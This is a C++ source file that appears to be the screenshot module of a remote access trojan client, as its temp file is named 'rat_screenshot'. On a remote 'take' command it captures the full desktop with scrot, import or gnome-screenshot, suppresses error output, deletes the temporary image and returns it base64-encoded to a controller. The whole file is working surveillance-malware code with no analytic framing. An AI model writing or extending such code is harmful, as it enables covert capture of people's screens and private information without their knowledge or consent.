#include "ClientScreenshotController.hpp"
#include "Utils/Base64.hpp"
#include <fstream>
#include <cstdlib>
#include <unistd.h>
#include <sys/wait.h>
#include <chrono>
#include <sstream>
#include <iomanip>

namespace Client {

nlohmann::json ClientScreenshotController::handleCommand(const nlohmann::json &cmd) {
    nlohmann::json reply;
    reply["controller"] = "screenshot";
    
    if (!cmd.contains("action")) {
        reply["success"] = false;
        reply["error"] = "Missing action field";
        return reply;
    }
    
    std::string action = cmd["action"];
    
    if (action == "take") {
        return takeScreenshot();
    } else {
        reply["success"] = false;
        reply["error"] = "Unknown action: " + action;
    }
    
    return reply;
}

nlohmann::json ClientScreenshotController::takeScreenshot() {
    nlohmann::json reply;
    reply["controller"] = "screenshot";
    reply["action"] = "take";
    
    
    auto now = std::chrono::system_clock::now();
    auto timestamp = std::chrono::system_clock::to_time_t(now);
    std::stringstream ss;
    ss << "/tmp/rat_screenshot_" << timestamp << ".png";
    std::string tempFile = ss.str();
    
    
    std::string cmd;
    if (system("which scrot >/dev/null 2>&1") == 0) {
        cmd = "scrot " + tempFile + " 2>/dev/null";
    } else if (system("which import >/dev/null 2>&1") == 0) {
        cmd = "import -window root " + tempFile + " 2>/dev/null";
    } else if (system("which gnome-screenshot >/dev/null 2>&1") == 0) {
        cmd = "gnome-screenshot -f " + tempFile + " 2>/dev/null";
    } else {
        reply["success"] = false;
        reply["error"] = "No screenshot tool found (tried: scrot, import, gnome-screenshot)";
        return reply;
    }
    
    
    int result = system(cmd.c_str());
    if (result != 0) {
        reply["success"] = false;
        reply["error"] = "Failed to execute screenshot command";
        unlink(tempFile.c_str());
        return reply;
    }
    
    
    usleep(100000); 
    
    
    std::ifstream file(tempFile, std::ios::binary);
    if (!file.is_open()) {
        reply["success"] = false;
        reply["error"] = "Failed to open screenshot file";
        unlink(tempFile.c_str());
        return reply;
    }
    
    std::string fileData((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    file.close();
    
    
    unlink(tempFile.c_str());
    
    if (fileData.empty()) {
        reply["success"] = false;
        reply["error"] = "Screenshot file is empty";
        return reply;
    }
    
    std::string encoded = Utils::base64_encode(fileData);
    
    reply["success"] = true;
    reply["data"] = encoded;
    reply["size"] = fileData.size();
    
    return reply;
}

} 
